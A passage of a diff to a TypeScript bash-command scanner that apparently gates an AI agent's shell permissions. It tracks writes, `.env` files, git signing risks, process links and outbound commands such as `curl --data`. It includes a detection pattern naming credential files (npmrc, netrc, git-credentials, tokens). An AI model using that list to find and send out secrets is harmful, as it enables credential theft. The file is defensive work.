@@ -1,15 +1,91 @@
-import { stat } from 'node:fs/promises';
-import { homedir, tmpdir } from 'node:os';
-import { basename, dirname, join, parse, resolve } from 'node:path';
+import { constants as fsConstants } from 'node:fs';
+import { lstat, open, readdir, readlink, realpath, stat } from 'node:fs/promises';
+import { homedir, tmpdir, userInfo } from 'node:os';
+import { basename, dirname, isAbsolute, join, parse, posix, sep, win32 } from 'node:path';
 import type { Node } from 'web-tree-sitter';
-import { arityPrefix, commandTokens, directoryOptionValues, droppedOnlySafeOptions } from './bashArity';
+import {
+  PACKAGE_VALUE_OPTIONS,
+  arityPrefix,
+  commandTokens,
+  directoryOptionValues,
+  droppedOnlySafeOptions,
+} from './bashArity';
 import { parseBash } from './bashParser';
 import { isEnvFile } from './envFiles';
-import { realpathNearest, resolveWithinRootsPhysically } from './paths';
+import {
+  commandSigning,
+  formatVerifies,
+  gitListed,
+  listedSetting,
+  plainRemote,
+  prettyNamesAlias,
+  prettyShowsSignatures,
+  settingsOn,
+  unlistedSigning,
+  type ConfigEntry,
+  type GitContacts,
+  type GitWord,
+  type SignatureFormat,
+} from './gitTable';
+import { own } from '@shared/ownKeys';
+import { ghReadFiles, repositoryWrite, type RepositoryWrite } from './ownRepository';
+import {
+  PathAccessDenied,
+  guardForm,
+  guardFormWithin,
+  isWithin,
+  onAnotherComputer,
+  operandPlaces,
+  operandTargets,
+  physicalTarget,
+  realpathNearest,
+  resolveOperand,
+  resolveWithinRootsPhysically,
+  type OperandReader,
+} from './paths';
+import {
+  diffListed,
+  diffTargets,
+  findFolders,
+  findLinks,
+  findOddPaths,
+  findRepositoryRoot,
+  findSettings,
+  GIT_VALUED_OPTIONS,
+  gitAliases,
+  gitCommandKind,
+  gitConfigFile,
+  gitDirectories,
+  gitListsBuiltin,
+  gitRefusesImplicitBare,
+  gitRemoteSettings,
+  gitRemoteUrls,
+  gitFreshLocation,
+  gitOnBranchIncludes,
+  gitPrettyConfig,
+  gitSigningConfig,
+  gitSubcommand,
+  gitToplevel,
+  indexListed,
+  inPlaceWrites,
+  pathHolds,
+  PLAIN_GIT_OPTIONS,
+  projectPathFolders,
+  SPELLED_PROGRAM,
+  splitGitAlias,
+  withGrantedRoots,
+  type GitAliases,
+  type GitRemoteSettings,
+  type GitScript,
+  type GitSigningCall,
+} from './shellWrites';
+import { wslLocation, wslUncPath, wslUserEnvironment } from '../../wsl/wslPath';
 
 export interface ShellCommand {
   /** The command's tokens with options before the subcommand dropped: what a remembered pattern is matched against. */
   text: string;
+  /** `text` with a git alias read as its expansion, set when it differs; only deny and ask rules consult it. */
+  expanded?: string;
   /** What "always allow" would remember for it, e.g. `git commit *`. */
   always: string;
   /**
@@ -24,27 +100,256 @@ export interface ShellCommand {
    * stdin): the leading words that name that form. A permission rule covers it only by naming them.
    */
   opaque?: string;
+  /** This part has something the scan cannot follow; never set when the whole script is unread (`ShellScan.unreadScript`). */
+  unread?: true;
+  /** This part is unread solely because an earlier readable Git command changed refs. */
+  refsMovedOnly?: true;
+  /** Why this part can send data off this computer, and the repository it writes when its words pin one. */
+  outbound?: { reason: string; target: RepositoryWrite | null };
+  /** `.env` files this part names as an argument. */
+  envFiles?: string[];
+  /** Why the git form this part runs is not one gitTable.ts lists, e.g. `git cleen`. */
+  gitUnlisted?: string;
+  /**
+   * The git form this part runs signs or verifies: its own words ask for it, or config the scan read or the script
+   * sets turns it on. Auto and Full require fresh consent (shellTools.ts `signingRisk`).
+   */
+  gitSigningRisk?: true;
+  /** This part deletes recursively or forcefully (`rm -r`/`-f`, `find -delete`, `find -exec rm {}`). */
+  deletes?: true;
 }
 
 export interface ShellScan {
+  /** A deferred signing/config check needs fresh consent but cannot be attributed to one part. */
+  gitSigningRisk?: true;
   commands: ShellCommand[];
   /** Physical paths named by the script, including paths inside shared roots and its starting folder. */
   paths?: string[];
+  /** Folders a glob, an expanded operand or a recursive command reaches anything under, so a protected folder within or below one is reached. */
+  globFolders?: string[];
+  /** Folders a glob reaches below, but only through names that do not start with a dot (`ls *`). */
+  dotlessGlobFolders?: string[];
   /** Directories the command reaches outside every granted root and the temp dirs. */
   directories: string[];
+  /** Paths in a WSL distro no root is in, named without reading them: asked every time, never offered as a grant. */
+  ungranted: string[];
   /** `.env` files named as an argument or an input redirect, which auto mode must not read unasked. */
   envFiles: string[];
   /** Why a command can send data off this computer, e.g. `curl --data`, which auto mode must not run unasked. */
   outbound: string[];
+  /** A command may send data unless every executed part is positively proven local. */
+  potentialOutbound: boolean;
   /**
-   * True when every command is one `containedCommand` accepts and nothing in the script sets the
-   * environment, so no part of it can carry data to a host of the caller's choosing. A reply that
-   * has read untrusted content still runs these unasked; see ChatService's DirectoryTurn.untrusted.
+   * Each outbound command's reason, with the repository it writes to when its words pin one (see
+   * `repositoryWrite`). Never set for a script that changes the environment, which can redirect git or gh.
    */
-  contained: boolean;
+  sends: { reason: string; target: RepositoryWrite | null }[];
+  /**
+   * True when every command only reads: a contained program that writes nothing, or a git
+   * subcommand that only reports (see `readOnlyGit`), with no redirect, in-place edit or
+   * environment change. Lets a worktree session read its main checkout unasked.
+   */
+  readOnly: boolean;
+  /** Files the script writes by redirect, `tee`, a copy or download destination, or in place (see shellWrites). */
+  writes: string[];
+  /** Folders whose contents the script may rewrite, such as an archive's extraction folder. */
+  writtenTrees: string[];
+  /**
+   * What the commands that are not read-only name, and the folder each runs in. A path named only by a
+   * command that reads lies outside it, so auto mode need not ask about a folder that is only read.
+   */
+  writtenPlaces?: string[];
+  /**
+   * Set when a path operand is decided by something the scan cannot read: a variable, a substitution, an xargs
+   * replace string, a word joined across lines, or a folder a directory change may or may not have reached.
+   */
+  unread?: true;
+  /**
+   * Set when what the scan cannot follow is not one part's alone: a backslash-newline join, a rebound name, a
+   * check across parts, or any part that runs after a directory change the scan lost. No part is then coverable.
+   */
+  unreadScript?: true;
+  /** Set when the script exports or rebinds an environment variable every later part inherits, so its parts are not decided one by one. */
+  setsEnvironment?: true;
+  /** A `git config` key the script sets that makes git run a program, such as `core.fsmonitor`. */
+  gitProgram?: string;
+  /** Set when git looks for a git-<name> program on a PATH entry the script sets that the scan cannot place. */
+  gitPathUnplaced?: true;
+  /** Set when a command checks out a tree from another computer, whose files no scan can list beforehand. */
+  remoteTree?: true;
 }
 
 const CHANGES_DIRECTORY = new Set(['cd', 'chdir', 'pushd', 'popd']);
+const COPIES = new Set(['cp', 'mv', 'install', 'ln', 'rsync', 'scp']);
+// The short flag may close a cluster (`-fsSLo`, `-qO`); curl's `-O` names no path, so case matters.
+const DOWNLOAD_OUTPUT = new Map<string, { long: string; short: RegExp }>([
+  ['wget', { long: '--output-document', short: /^-[a-zA-Z]*?O(.*)$/ }],
+]);
+
+/**
+ * Short options that take a value, and the file options among them (`w` written, `r` read), for programs whose
+ * file options the scan reads even when glued to their value (`-o<path>`, `-cf<path>`); long ones by full name.
+ */
+const OPTION_FILES: Readonly<
+  Record<string, { valued: string; files: Record<string, 'r' | 'w'>; long?: Record<string, 'r' | 'w'> }>
+> = {
+  sort: { valued: 'kStTo', files: { o: 'w', T: 'w' }, long: { output: 'w', 'temporary-directory': 'w' } },
+  shuf: { valued: 'ion', files: { o: 'w' }, long: { output: 'w' } },
+  iconv: { valued: 'fto', files: { o: 'w' }, long: { output: 'w' } },
+  tree: { valued: 'LPIoHT', files: { o: 'w' } },
+  tar: { valued: 'bCfFgHIKLNTVX', files: { f: 'r', C: 'r', g: 'w', X: 'r' }, long: { file: 'r', directory: 'r' } },
+  'git format-patch': { valued: 'ovN', files: { o: 'w' }, long: { 'output-directory': 'w', output: 'w' } },
+};
+
+/**
+ * Each file option value of `args` as `{ raw, write }`, glued or not, split by the program's option grammar so
+ * `-so<path>` reads as `-s -o <path>`; a tar archive counts as written when the call creates one. Null when a
+ * glued value starts inside quoting the scan cannot split.
+ */
+function optionFiles(program: string, args: readonly string[]): { raw: string; write: boolean }[] | null {
+  const sub = bashOption(args[0] ?? '');
+  const key = program === 'bsdtar' ? 'tar' : program === 'git' && sub === 'format-patch' ? 'git format-patch' : program;
+  const grammar = own(OPTION_FILES, key);
+  if (!grammar) return [];
+  const words = key === 'git format-patch' ? args.slice(1) : args;
+  const found: { raw: string; write: boolean; letter: string }[] = [];
+  let creates = false;
+  for (let index = 0; index < words.length; index++) {
+    const raw = words[index] as string;
+    const value = bashOption(raw);
+    if (value === null) {
+      // tree takes each value from the next word, so a brace copying `-I{o,o}` to `-Io -Io` makes `-o` options.
+      if (key === 'tree' && wordPieces(raw).some(piece => isActive(piece, '{'))) return null;
+      const fixed = fixedOption(raw, grammar.valued);
+      if (fixed === null) return null;
+      if (key === 'tar' && /[cruA]/.test(fixed.flags)) creates = true;
+      const kind = fixed.long ? own(grammar.long ?? {}, fixed.name) : own(grammar.files, fixed.name);
+      if (kind === undefined) continue;
+      if (fixed.value === null) return null;
+      found.push({ raw: fixed.value, write: kind === 'w', letter: fixed.name });
+      continue;
+    }
+    if (value === '--') break;
+    const oldStyle = key === 'tar' && index === 0 && /^[A-Za-z]+$/.test(value);
+    if (value.startsWith('--')) {
+      const [name = '', glued] = value.slice(2).split(/=(.*)/s);
+      if (key === 'tar' && /^(create|append|update|catenate|concatenate)$/.test(name)) creates = true;
+      const kind = grammar.long ? own(grammar.long, name) : undefined;
+      if (kind === undefined) continue;
+      const text = glued ?? words[++index];
+      if (text !== undefined) found.push({ raw: text, write: kind === 'w', letter: name });
+      continue;
+    }
+    if (!oldStyle && (!value.startsWith('-') || value === '-')) continue;
+    // A glued value is sliced from the word as written, which only works while no quote precedes it.
+    const letters = oldStyle ? value : value.slice(1);
+    for (let at = 0; at < letters.length; at++) {
+      const letter = letters[at] as string;
+      if (key === 'tar' && 'cruA'.includes(letter)) creates = true;
+      if (!grammar.valued.includes(letter)) continue;
+      const tail = letters.slice(at + 1);
+      let text: string | undefined;
+      if (tail !== '' && !oldStyle) {
+        const prefix = raw.slice(0, at + 2);
+        if (prefix !== value.slice(0, at + 2) || /['"\\$`]/.test(prefix)) return null;
+        text = raw.slice(at + 2);
+      } else {
+        text = words[++index];
+      }
+      const kind = own(grammar.files, letter);
+      if (kind !== undefined && text !== undefined) found.push({ raw: text, write: kind === 'w', letter });
+      if (!oldStyle) break;
+    }
+  }
+  return found.map(({ raw, write, letter }) => ({
+    raw,
+    write: write || (creates && (letter === 'f' || letter === 'file')),
+  }));
+}
+const GIT_CONFIG_SETS =
+  /^(set|unset|edit|-e|--edit|--add|--unset|--unset-all|--replace-all|--rename-section|--remove-section|rename-section|remove-section)$/;
+
+/** Programs that only read what they are pointed at, when `containedCommand` also vouches for the call. */
+const READ_PROBES = new Set(['ls', 'cat', 'head', 'tail', 'stat', 'file', 'wc', 'du', 'tree', 'find']);
+
+/**
+ * Where version managers and package managers install toolchains. An agent lists and reads these
+ * to find which node or pnpm a project runs on; they hold binaries and package code, not secrets.
+ * Deliberately narrow: `~/.local/share` as a whole also holds keyrings and app data.
+ */
+function toolchainLocations(home: string, joinIn: (...parts: string[]) => string): string[] {
+  const system = [
+    '/etc/profiles',
+    '/nix/store',
+    '/nix/var/nix/profiles',
+    '/run/current-system/sw',
+    '/opt/homebrew/bin',
+    '/opt/homebrew/opt',
+    '/opt/homebrew/Cellar',
+    '/usr/local/bin',
+    '/usr/local/lib/node_modules',
+    '/usr/bin',
+    '/bin',
+  ];
+  return [
+    ...[
+      '.nvm',
+      '.volta',
+      '.fnm',
+      '.bun',
+      '.deno',
+      '.cargo/bin',
+      '.rustup/toolchains',
+      '.pyenv/versions',
+      '.rbenv/versions',
+      '.asdf/installs',
+      '.asdf/shims',
+      '.nix-profile',
+      '.local/bin',
+      '.local/share/pnpm',
+      '.local/share/fnm',
+      '.local/share/mise/installs',
+      'Library/pnpm',
+    ].map(path => joinIn(home, path)),
+    ...system,
+  ];
+}
+
+// Credential files a package manager or a shell keeps beside its toolchain.
+const SECRET_NAME = /^\.?(npmrc|netrc|pypirc|git-credentials|yarnrc(\.yml)?)$|credential|secret|token/i;
+
+const namesSecret = (path: string): boolean =>
+  path.split(/[\\/]/).some(part => SECRET_NAME.test(part)) || isEnvFile(path);
+
+/**
+ * Whether a path outside the project is a toolchain install that a read-only probe may look at
+ * unasked, both as written and with every symlink followed, so `~/.nvm/link -> ~/.ssh` still asks.
+ * In a WSL folder the toolchains are the distro's, and `home` is the distro user's Linux home.
+ */
+export async function isToolchainPath(path: string, cwd: string, home: string = homedir()): Promise<boolean> {
+  const wsl = wslLocation(cwd);
+  const named = toolchainLocations(home, wsl ? posix.join : join);
+  const locations = wsl ? named.map(location => wslUncPath(wsl, location)) : named;
+  // Only the part below a toolchain root is checked: the root is trusted, and folders above it
+  // (the home folder, a checkout path) may legitimately be named like a secret.
+  const below = (candidate: string, roots: string[]): string => {
+    const rest = roots
+      .filter(root => candidate === root || candidate.startsWith(root.endsWith(sep) ? root : root + sep))
+      .map(root => candidate.slice(root.length));
+    return rest.length ? rest.reduce((a, b) => (a.length >= b.length ? a : b)) : candidate;
+  };
+  if (operandTargets(cwd, path).some(target => namesSecret(below(target, locations)))) return false;
+  try {
+    // Each root is resolved the way the path is: a root that does not exist under a linked
+    // parent (macOS `/etc` -> `/private/etc`) must still match the path's physical form.
+    const roots = await Promise.all(
+      locations.map((root, index) => resolveWithinRootsPhysically(named[index] ?? root, [parse(root).root], root))
+    );
+    return !namesSecret(below(await resolveWithinRootsPhysically(path, roots, cwd), roots));
+  } catch {
+    return false;
+  }
+}
 
 // Ported from opencode's shell tool, plus commands that write to a path or read one by name.
 const TOUCHES_FILES = new Set([
@@ -75,7 +380,37 @@ const TOUCHES_FILES = new Set([
 
 const SUBSHELLS = new Set(['subshell', 'command_substitution', 'process_substitution']);
 
+/** Statements whose parts may run zero, one or many times, so a directory change in them may not happen. */
+const BRANCHES = new Set([
+  'if_statement',
+  'while_statement',
+  'for_statement',
+  'c_style_for_statement',
+  'case_statement',
+]);
+
+/** Nodes whose body can run more than once, or later than where the scan reads it. */
+const REPEATS = new Set(['while_statement', 'for_statement', 'c_style_for_statement', 'function_definition']);
+
 const HARMLESS_REDIRECT_TARGETS = new Set(['/dev/null', '/dev/stdin', '/dev/stdout', '/dev/stderr', '/dev/tty']);
+
+/** Devices an operand may name without reaching a folder outside the project (`cat /dev/null`, `head /dev/urandom`). */
+const HARMLESS_DEVICES: ReadonlySet<string> = new Set([
+  ...HARMLESS_REDIRECT_TARGETS,
+  '/dev/zero',
+  '/dev/random',
+  '/dev/urandom',
+]);
+
+/** A path through a process's own links (`/proc/self/cwd`, `/dev/fd/3`), which lead wherever that process is. */
+const PROCESS_LINK =
+  /^\/+(proc\/+(self|thread-self|\d+|[^/]*[*?[][^/]*)(\/|$)|dev\/+(fd(\/|$)|(stdin|stdout|stderr)\/))/;
+
+const viaProcess = (path: string): boolean => !HARMLESS_REDIRECT_TARGETS.has(path) && PROCESS_LINK.test(path);
+
+/** Tests the text and its lexical form from `cwd`, as `/x/../proc/self` and `../../proc/self` reach the same place. */
+const throughProcess = (path: string, cwd: string): boolean =>
+  viaProcess(path) || viaProcess(posix.normalize(posix.isAbsolute(path) ? path : posix.join(cwd, path)));
 
 const WRITE_OPERATORS = new Set(['>', '>>', '>|', '&>', '&>>', '>&']);
 
@@ -119,9 +454,13 @@ function globMayMatchEnvFile(path: string): boolean {
   const name = basename(path);
   if (isEnvFile(name.replace(/\[[^\]]*\]|[?*]/g, ''))) return true;
   if (/^[?*[]/.test(name)) return false;
+  // A bracket expression matches one character, so it is read as `?`: copied into a RegExp as written, a
+  // range such as `[d-1]` is invalid and would report the name as a possible `.env`.
+  // One `.*` per run of stars keeps the backtracking bounded by the short samples.
   const pattern = name
-    .replace(/[.+^${}()|\\]/g, '\\$&')
-    .replace(/\*/g, '.*')
+    .replace(/\[[!^]?\]?[^\]]*\]/g, '?')
+    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
+    .replace(/\*+/g, '.*')
     .replace(/\?/g, '.');
   try {
     const matcher = new RegExp(`^${pattern}$`);
@@ -131,21 +470,50 @@ function globMayMatchEnvFile(path: string): boolean {
   }
 }
 
-function unquote(text: string): string {
+export function unquote(text: string): string {
   if (text.length < 2) return text;
   const first = text[0];
   return (first === '"' || first === "'") && text.at(-1) === first ? text.slice(1, -1) : text;
 }
 
-/** `~` and `$HOME` are the user's home, which the shell expands before the program sees it. */
-function expandHome(text: string): string {
-  const home = homedir();
+/** A word as bash hands it to the program, with its quotes removed and its backslash escapes applied. */
+export function wordValue(word: string): string {
+  let value = '';
+  for (let at = 0; at < word.length; at++) {
+    const char = word[at] as string;
+    if (char === "'") {
+      const end = word.indexOf("'", at + 1);
+      value += word.slice(at + 1, end === -1 ? word.length : end);
+      at = end === -1 ? word.length : end;
+    } else if (char === '"') {
+      for (at++; at < word.length && word[at] !== '"'; at++) {
+        const next = word[at + 1];
+        if (word[at] === '\\' && next !== undefined && '$`"\\\n'.includes(next)) {
+          at++;
+          if (next !== '\n') value += next;
+        } else {
+          value += word[at];
+        }
+      }
+    } else if (char === '\\' && at + 1 < word.length) {
+      at++;
+      if (word[at] !== '\n') value += word[at];
+    } else {
+      value += char;
+    }
+  }
+  return value;
+}
+
+/** `~` and `$HOME` are the user's home, which the shell expands before the program sees it. A Linux home is joined by Linux rules. */
+export function expandHome(text: string, home: string = homedir()): string {
+  const rules = home.startsWith('/') ? posix : { join, dirname };
   if (text === '~') return home;
-  if (text.startsWith('~/')) return join(home, text.slice(2));
+  if (text.startsWith('~/')) return rules.join(home, text.slice(2));
   const named = /^~([^/]+)(\/.*)?$/.exec(text);
-  if (named) return join(dirname(home), named[1], named[2] ?? '');
+  if (named) return rules.join(rules.dirname(home), named[1], named[2] ?? '');
   const variable = /^\$(?:HOME|\{HOME\})(\/.*)?$/.exec(text);
-  if (variable) return join(home, variable[1] ?? '');
+  if (variable) return rules.join(home, variable[1] ?? '');
   return text;
 }
 
@@ -160,26 +528,4074 @@ function globPrefix(text: string): string | null {
   return match.index === 0 ? null : text.slice(0, match.index);
 }
 
-// ponytail: a wrapper's own option values (`sudo -u bob`, `xargs -I {}`) are read as the program;
-// a full per-wrapper option table if that matters.
-const WRAPPERS = new Set(['sudo', 'env', 'command', 'exec', 'nohup', 'time', 'nice', 'timeout', 'xargs']);
+/**
+ * One character of a word with its quotes removed, `active` when unquoted so a glob or brace in it is live; or an
+ * expansion, `unquoted` when it stands outside double quotes. An empty quoted segment is a zero-width inactive
+ * character, so brace alternatives can distinguish a retained empty argument from an unquoted one bash drops.
+ */
+type WordPiece = { char: string; active: boolean } | { expansion: string; unquoted?: true };
+
+/** The index just past the `close` that balances the run starting at `from`, skipping escapes and single quotes. */
+function matchingEnd(word: string, from: number, open: string, close: string): number {
+  let depth = 1;
+  for (let at = from; at < word.length; at++) {
+    const char = word[at];
+    if (char === '\\') {
+      at++;
+    } else if (char === close) {
+      if (--depth === 0) return at + 1;
+    } else if (open !== '' && char === open) {
+      depth++;
+    } else if (char === "'" && close !== '"') {
+      const end = word.indexOf("'", at + 1);
+      at = end === -1 ? word.length : end;
+    }
+  }
+  return word.length;
+}
+
+/** Where the `$` or backtick expansion at `at` ends; `at + 1` when the `$` is a literal one. */
+function expansionEnd(word: string, at: number, quoted: boolean): number {
+  const next = word[at + 1] ?? '';
+  if (word[at] === '`') return matchingEnd(word, at + 1, '', '`');
+  if (next === '(') return matchingEnd(word, at + 2, '(', ')');
+  if (next === '{') return matchingEnd(word, at + 2, '{', '}');
+  if (next === '[') return matchingEnd(word, at + 2, '[', ']');
+  // `$'\x2e'` and `$"..."` are decoded or translated by bash, so they are read as expansions.
+  if (!quoted && (next === "'" || next === '"')) return matchingEnd(word, at + 2, '', next);
+  if (/[A-Za-z_]/.test(next)) {
+    let end = at + 2;
+    while (end < word.length && /\w/.test(word[end] as string)) end++;
+    return end;
+  }
+  if (/[0-9@*#?$!-]/.test(next)) return at + 2;
+  return at + 1;
+}
+
+/**
+ * A word's characters as bash reads them: quotes removed, backslash escapes applied, and each expansion kept whole.
+ * `unquotedAt` collects the offset in `word` of each active piece.
+ */
+function wordPieces(word: string, unquotedAt?: number[]): WordPiece[] {
+  const pieces: WordPiece[] = [];
+  const push = (char: string, active: boolean): void => {
+    pieces.push({ char, active });
+  };
+  const expansion = (at: number, quoted: boolean): number => {
+    const end = expansionEnd(word, at, quoted);
+    if (end === at + 1) push(word[at] as string, false);
+    else pieces.push(quoted ? { expansion: word.slice(at, end) } : { expansion: word.slice(at, end), unquoted: true });
+    return end - 1;
+  };
+  for (let at = 0; at < word.length; at++) {
+    const char = word[at] as string;
+    if (char === '\\') {
+      if (at + 1 >= word.length) push(char, false);
+      else if (word[++at] !== '\n') push(word[at] as string, false);
+    } else if (char === "'") {
+      const end = word.indexOf("'", at + 1);
+      const stop = end === -1 ? word.length : end;
+      if (stop === at + 1) push('', false);
+      for (let quoted = at + 1; quoted < stop; quoted++) push(word[quoted] as string, false);
+      at = stop;
+    } else if (char === '"') {
+      if (word[at + 1] === '"') push('', false);
+      for (at++; at < word.length && word[at] !== '"'; at++) {
+        const inner = word[at] as string;
+        if (inner === '\\' && at + 1 < word.length && '$`"\\\n'.includes(word[at + 1] as string)) {
+          if (word[++at] !== '\n') push(word[at] as string, false);
+        } else if (inner === '$' || inner === '`') {
+          at = expansion(at, true);
+        } else {
+          push(inner, false);
+        }
+      }
+    } else if (char === '$' || char === '`') {
+      at = expansion(at, false);
+    } else {
+      unquotedAt?.push(at);
+      push(char, true);
+    }
+  }
+  return pieces;
+}
+
+/** A `$(`, `$((`, `<(` or `>(` substitution, or a `$'` string, the parser found in a word, and where it ends. */
+interface BraceScanSkip {
+  end: number;
+  kind: 'command' | 'process' | 'ansi';
+}
+
+/**
+ * The offsets of the `{`, `}`, `,` and `.` bash's brace expansion reads as unquoted in `word`, by its own quote
+ * rules (braces.c `brace_gobbler`): within double quotes a backtick or `${` opens no quote, so a `"` inside one
+ * ends the double quote. bash 5 skips a `$(` substitution in or out of double quotes, and a `<(` or `>(` one; bash
+ * 3.2 (macOS `/bin/bash`) skips only a `$(` outside them. Null when a `$'` string sits where that reading is quoted.
+ */
+function braceScanUnquoted(word: string, skips: ReadonlyMap<number, BraceScanSkip>, bash5: boolean): number[] | null {
+  const unquoted: number[] = [];
+  let quote = '';
+  // Depth inside an unquoted `${`, where no brace, comma or `..` counts.
+  let level = 0;
+  for (let at = 0; at < word.length; at++) {
+    const skip = skips.get(at);
+    // The parser turns a `$'` string into a single-quoted one before brace expansion reads the word.
+    if (skip?.kind === 'ansi' && quote !== '') return null;
+    if (
+      skip !== undefined &&
+      (quote === '' ? skip.kind !== 'process' || bash5 : quote === '"' && skip.kind === 'command' && bash5)
+    ) {
+      at = skip.end - 1;
+      continue;
+    }
+    const char = word[at] as string;
+    if (char === '\\' && quote !== "'") {
+      at++;
+    } else if (char === '$' && word[at + 1] === '{' && quote !== "'") {
+      at++;
+      if (quote === '') level++;
+    } else if (quote !== '') {
+      if (char === quote) quote = '';
+    } else if (char === '"' || char === "'" || char === '`') {
+      quote = char;
+    } else if (level > 0) {
+      if (char === '{') level++;
+      else if (char === '}') level--;
+    } else if ('{},.'.includes(char)) {
+      unquoted.push(at);
+    }
+  }
+  return unquoted;
+}
+
+/**
+ * Whether bash 3.2 or 5 may brace-expand a word around a `{`, `}`, `,` or `.` that wordPieces reads as quoted or
+ * inside an expansion: ``"`x "{a,b}"`"`` runs `x "a"` and `x "b"`.
+ */
+function braceScanDiffers(node: Node): boolean {
+  const word = node.text;
+  if (!word.includes('{') || !(word.includes(',') || word.includes('..'))) return false;
+  const skips = new Map<number, BraceScanSkip>();
+  const collect = (inner: Node): void => {
+    const kind =
+      inner.type === 'process_substitution'
+        ? 'process'
+        : inner.type === 'ansi_c_string'
+          ? 'ansi'
+          : /^(command_substitution|arithmetic_expansion)$/.test(inner.type) && inner.text.startsWith('$(')
+            ? 'command'
+            : null;
+    if (kind) skips.set(inner.startIndex - node.startIndex, { end: inner.endIndex - node.startIndex, kind });
+    for (const child of inner.children) if (child) collect(child);
+  };
+  collect(node);
+  const read: number[] = [];
+  wordPieces(word, read);
+  const scanned = new Set(read);
+  return [false, true].some(bash5 => {
+    const found = braceScanUnquoted(word, skips, bash5);
+    if (found === null) return true;
+    const unquoted = new Set(found);
+    const opens = found.some(at => word[at] === '{');
+    const splits = found.some(
+      at => word[at] === ',' || (word[at] === '.' && word[at + 1] === '.' && unquoted.has(at + 1))
+    );
+    return opens && splits && found.some(at => !scanned.has(at));
+  });
+}
+
+const isActive = (piece: WordPiece | undefined, char: string): boolean =>
+  piece !== undefined && 'char' in piece && piece.active && piece.char === char;
+
+/** More words than this from one brace expansion leave the operand unread. */
+const BRACE_LIMIT = 64;
+/** A word with braces longer than this is not expanded, which keeps the search for pairs bounded. */
+const BRACE_PIECES = 1024;
+
+/**
+ * The words a plain `{a..e}` or `{-1..3}` sequence makes, or null for any other amble. Only plain sequences mean the
+ * same in every bash: 3.2 (macOS `/bin/bash`) leaves `{1..9..2}` as written, drops the padding of `{01..3}` and
+ * truncates a bound past 32 bits.
+ */
+function braceSequence(inner: readonly WordPiece[]): WordPiece[][] | null {
+  if (!inner.every(piece => 'char' in piece && piece.active)) return null;
+  const text = inner.map(piece => ('char' in piece ? piece.char : '')).join('');
+  const numeric = /^(-?(?:0|[1-9]\d*))\.\.(-?(?:0|[1-9]\d*))$/.exec(text);
+  const letters = /^([A-Za-z])\.\.([A-Za-z])$/.exec(text);
+  const match = numeric ?? letters;
+  if (!match) return null;
+  const [from, to] = numeric
+    ? [Number(match[1]), Number(match[2])]
+    : [(match[1] as string).charCodeAt(0), (match[2] as string).charCodeAt(0)];
+  if (![from, to].every(bound => bound >= -0x80000000 && bound <= 0x7fffffff)) return null;
+  // Bash reads a `\` or backtick a letter range between `Z` and `a` makes as quoting, not as a letter.
+  if (letters && Math.min(from, to) <= 0x60 && Math.max(from, to) >= 0x5b) return null;
+  const count = Math.abs(to - from) + 1;
+  if (count > BRACE_LIMIT) return null;
+  const words: WordPiece[][] = [];
+  for (let index = 0; index < count; index++) {
+    const value = from + (to >= from ? index : -index);
+    const text = numeric ? String(value) : String.fromCharCode(value);
+    words.push([...text].map(char => ({ char, active: false })));
+  }
+  return words;
+}
+
+const isUnquoted = (piece: WordPiece | undefined, expansion: RegExp): boolean =>
+  piece !== undefined && 'expansion' in piece && piece.unquoted === true && expansion.test(piece.expansion);
+
+/** An unquoted `$name` before a letter, digit or underscore, which bash reads as part of the name. */
+const extendsName = (word: readonly WordPiece[]): boolean =>
+  word.some((piece, at) => {
+    const next = word[at + 1];
+    return isUnquoted(piece, /^\$[A-Za-z_]\w*$/) && next !== undefined && 'char' in next && /\w/.test(next.char);
+  });
+
+/**
+ * Bash's brace expansion, which runs before every other. Null past BRACE_LIMIT words, for a `..` in braces that make
+ * no plain sequence (bash versions read those apart), for a `,` or `..` among braces that do not balance (bash
+ * pairs a `{` with the first `}` past one at its own level), or for a word whose `$name` an option extends.
+ */
+function expandBraces(pieces: readonly WordPiece[]): WordPiece[][] | null {
+  const words = braceAlternatives(pieces);
+  // Bash drops an unquoted empty alternative. Losing an operand can make find act on `.` instead.
+  return words?.some(word => word.length === 0) ? null : words;
+}
+
+/** Brace alternatives before empty unquoted words are removed; recursive parts may legitimately be empty. */
+function braceAlternatives(pieces: readonly WordPiece[]): WordPiece[][] | null {
+  if (!pieces.some(piece => isActive(piece, '{'))) return [[...pieces]];
+  if (pieces.length > BRACE_PIECES) return null;
+  // bash reads `$${` as `$` and a `${` it skips whole, expanding no braces inside.
+  if (pieces.some((piece, at) => isUnquoted(piece, /^\$\$$/) && isActive(pieces[at + 1], '{'))) return null;
+  const dotsAt = (list: readonly WordPiece[], at: number): boolean =>
+    isActive(list[at], '.') && isActive(list[at + 1], '.');
+  const closes = new Map<number, number>();
+  const opens: number[] = [];
+  let balanced = true;
+  pieces.forEach((piece, at) => {
+    if (isActive(piece, '{')) opens.push(at);
+    else if (isActive(piece, '}')) {
+      const open = opens.pop();
+      if (open === undefined) balanced = false;
+      else closes.set(open, at);
+    }
+  });
+  if (!balanced || opens.length > 0) {
+    return pieces.some((piece, at) => isActive(piece, ',') || dotsAt(pieces, at)) ? null : [[...pieces]];
+  }
+  for (const [open, close] of [...closes].sort(([a], [b]) => a - b)) {
+    const inner = pieces.slice(open + 1, close);
+    const commas: number[] = [];
+    let dots = false;
+    let depth = 0;
+    inner.forEach((piece, at) => {
+      if (isActive(piece, '{')) depth++;
+      else if (isActive(piece, '}')) depth--;
+      else if (depth === 0 && isActive(piece, ',')) commas.push(at);
+      else if (depth === 0 && dotsAt(inner, at)) dots = true;
+    });
+    const bounds = [-1, ...commas, inner.length];
+    const options =
+      commas.length > 0
+        ? bounds.slice(1).map((end, index) => inner.slice((bounds[index] as number) + 1, end))
+        : braceSequence(inner);
+    if (options === null) {
+      if (dots) return null;
+      continue;
+    }
+    // As bash: the text before stays as written, and each option and the rest expand on their own.
+    const tails = braceAlternatives(pieces.slice(close + 1));
+    if (tails === null) return null;
+    const words: WordPiece[][] = [];
+    for (const option of options) {
+      const middles = braceAlternatives(option);
+      if (middles === null) return null;
+      for (const middle of middles) {
+        for (const tail of tails) {
+          const word = [...pieces.slice(0, open), ...middle, ...tail];
+          // `$PWD{_,x}` is `$PWD_` and `$PWDx` to bash, which expands braces before variables.
+          if (extendsName(word)) return null;
+          words.push(word);
+          if (words.length > BRACE_LIMIT) return null;
+        }
+      }
+    }
+    return words;
+  }
+  return [[...pieces]];
+}
+
+/** Stands in for an expansion the scan cannot fill in. */
+const EXPANSION_MARK = '\u0000';
+
+/** One word as the program receives it, as far as the scan can tell. */
+interface OperandWord {
